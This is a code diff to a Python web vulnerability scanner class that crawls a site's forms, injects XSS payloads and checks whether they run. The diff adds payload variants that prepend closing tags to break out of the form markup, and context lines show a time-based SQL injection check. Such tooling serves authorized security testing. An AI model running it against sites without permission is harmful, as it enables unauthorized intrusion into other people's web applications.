@@ -1,3 +1,5 @@
+from typing import List, Text
+
 import requests, re, urllib.parse as urlparse
 from bs4 import BeautifulSoup
 import time
@@ -28,6 +30,17 @@ class Charlotte:
         response = self.session.get(url)
         parsed_html = BeautifulSoup(response.content, features='lxml')
         return parsed_html.findAll('form')
+
+# In order to build better payloads - it is necessary to get the closing tags of the forms, in order to inject the
+# payload as part of the Javascript itself.
+    def extract_closing_tags_for_form(self, form) -> List[Text]:
+        closing_tags = []
+        for sibling in form.find_all(recursive=False):
+            if sibling == form:
+                break
+            closing_tags.append(f"</{sibling.name}>")
+
+        return closing_tags
 
 # Input payloads to the webpage
     def submit_forms(self, form, value, url):
@@ -83,6 +96,7 @@ class Charlotte:
                             matches = alert_pattern.findall(response.text)
                             if matches:
                                 print("XSS SUCCESSFUL FOR PAYLOAD: " + payload)
+                                print("IN FORM: " + form)
             else:
                 for form in forms:
                     for payload in xss_payloads.payloads:
@@ -91,6 +105,36 @@ class Charlotte:
                         matches = alert_pattern.findall(response.text)
                         if matches:
                             print("XSS SUCCESSFUL FOR PAYLOAD: " + payload)
+                            print("IN FORM: " + form)
+
+# Dynamically generated, complex XSS payloads based on opening tags prior to input
+    def advanced_xss_in_form(self, path_to_payloads=None):
+        urls = self.extract_same_site_urls(self.url)
+        for url in urls:
+            forms = self.extract_forms(url)
+            if path_to_payloads:
+                with open(path_to_payloads, 'r') as payloads_content:
+                    for form in forms:
+                        closing_tags = self.extract_closing_tags_for_form(form)
+                        closing_tags_string = "".join(closing_tags)
+                        for payload in payloads_content:
+                            alert_pattern = re.compile(r'alert\(([^)]+)\)')
+                            response = self.submit_forms(form, closing_tags_string + payload, url)
+                            matches = alert_pattern.findall(response.text)
+                            if matches:
+                                print("XSS SUCCESSFUL FOR ADVANCED PAYLOAD: " + closing_tags_string + payload)
+                                print("IN FORM: " + form)
+            else:
+                for form in forms:
+                    closing_tags = self.extract_closing_tags_for_form(form)
+                    closing_tags_string = "".join(closing_tags)
+                    for payload in xss_payloads.payloads:
+                        alert_pattern = re.compile(r'alert\(([^)]+)\)')
+                        response = self.submit_forms(form, closing_tags_string + payload, url)
+                        matches = alert_pattern.findall(response.text)
+                        if matches:
+                            print("XSS SUCCESSFUL FOR ADVANCED PAYLOAD: " + closing_tags_string + payload)
+                            print("IN FORM: " + form)
 
 # Check if different boolean values of SQL injections cause different behaviors, suggesting compromise
     def time_based_sqli(self):
